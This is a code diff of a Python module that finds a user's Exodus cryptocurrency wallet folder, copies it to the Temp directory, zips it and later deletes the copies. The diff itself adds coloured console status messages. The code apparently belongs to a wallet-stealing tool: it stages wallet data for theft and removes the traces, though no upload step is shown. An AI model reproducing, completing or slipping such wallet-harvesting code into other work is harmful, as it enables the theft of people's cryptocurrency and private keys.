@@ -1,6 +1,8 @@
 import shutil
 import os.path 
 
+from colorama import *
+
 client: str = os.path.expanduser("~")
 source_dir = client + "\\AppData\\Roaming\\Exodus"
 dest_dir = client + "\\AppData\\Local\\Temp\\Exodus"
@@ -16,6 +18,7 @@ class Files:
             bool: If the path exists or not.
         """
         if os.path.exists(client + "\\AppData\\Roaming\\Exodus"):
+            print(f"{Fore.GREEN}[PATH FOUND]{Fore.RESET} {client}\\AppData\\Roaming\\Exodus")
             return True
         else:
             return False
@@ -29,10 +32,12 @@ class Files:
         try:
             if os.path.exists(dest_dir):
                 shutil.rmtree(dest_dir)
+                print(f"{Fore.RED}[REMOVED PATH]{Fore.RESET} {dest_dir}")
                 
             shutil.copytree(source_dir, dest_dir)
             shutil.make_archive(dest_dir, "zip", dest_dir)
             
+            print(f"{Fore.GREEN}[CREATED ZIP]{Fore.RESET} {dest_dir}")
             
             return True
         except:
@@ -46,8 +51,9 @@ class Files:
         """
         try:
             os.remove(client + "\\AppData\\Local\\Temp\\Exodus.zip")
+            print(f"{Fore.GREEN}[REMOVED FILES]{Fore.RESET} {client}\\AppData\\Local\\Temp\\Exodus.zip")
             os.remove(client + "\\AppData\\Local\\Temp\\Exodus")
-            
+            print(f"{Fore.GREEN}[REMOVED FILES]{Fore.RESET} {client}\\AppData\\Local\\Temp\\Exodus")
             return True
         except:
             return False
